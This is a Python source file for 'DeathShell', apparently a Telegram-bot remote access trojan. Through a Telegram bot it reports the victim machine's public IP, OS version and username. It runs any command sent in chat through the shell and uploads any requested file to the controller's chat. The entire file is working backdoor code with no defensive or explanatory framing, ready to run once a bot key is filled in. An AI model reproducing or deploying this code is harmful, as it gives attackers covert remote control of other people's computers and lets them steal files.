import requests
from telegram.ext import *
import os
import subprocess
import json

class DeathShell:

    def __init__(self, API_KEY: str):
        self.updater = Updater(API_KEY, use_context=True)
        self.dp = self.updater.dispatcher
        self.dp.add_handler(MessageHandler(Filters.text, self.handle_message))
        self.dp.add_error_handler(self.error)
        self.updater.start_polling(1.0)
        self.updater.idle()

    def error(self, update, context):
        # Logs errors
        update.message.reply_text(f'Error :\n{json.load(context.error)}')

    def handle_message(self, update, context):
        text = str(update.message.text).lower()
        result = self.cmd(text, update, context)
        if len(result) > 4096:
            for x in range(0, len(result), 4096):
                update.message.reply_text(result[x:x + 4096])
        else:
            update.message.reply_text(result)
        ''''
        if len(text) <= 95:
            update.message.reply_text(result)
        else:
            results = result.split(" ")
            for i in results:
                update.message.reply_text(i)'''

    def cmd(self, command: str, update, contex) -> str:
        if command.startswith('/'):
            if command == '/start' or command == '/restart':
                return f"Ip Adderss: {requests.get('http://ip.42.pl/raw').text}\nVerson: {subprocess.getoutput('ver')}\nUser Name: {os.getlogin()}\n"
            elif command == '/help':
                return "Find Your Self"
            elif command == '/get':
                try:
                    contex.bot.send_document(chat_id=update.message.chat_id, document=open(command.split(" ")[1], 'rb'))
                    return "success"
                except Exception as e:
                    return e
        elif command.split(" ")[0] == "cd":
            if len(command.split(" ")) == 2:
                os.chdir(command.split(" ")[1])
            else:
                os.chdir(command[3:])
            return os.getcwd()
        elif command.split(" ")[0] == "ls":
            return ''.join(format(x + '\n') for x in os.listdir())
        elif command.split(" ")[0] == "pwd":
            return os.getcwd()
        elif command.split(" ")[0] == "com":
            # update.send_document(document=open('test.py', 'r'))
            if command.split(" ")[1] == "get":
                try:
                    contex.bot.send_document(chat_id=update.message.chat_id, document=open(command.split(" ")[2], 'rb'))
                    return "success"
                except Exception as e:
                    return e
            else:
                return "Unknown Internal Commands"
        else:
            try:
                return subprocess.check_output(command, shell=True).decode('utf-8')
            except subprocess.CalledProcessError:
                return "Error"



if __name__ == "__main__":
    bot = DeathShell("Your Bot Key")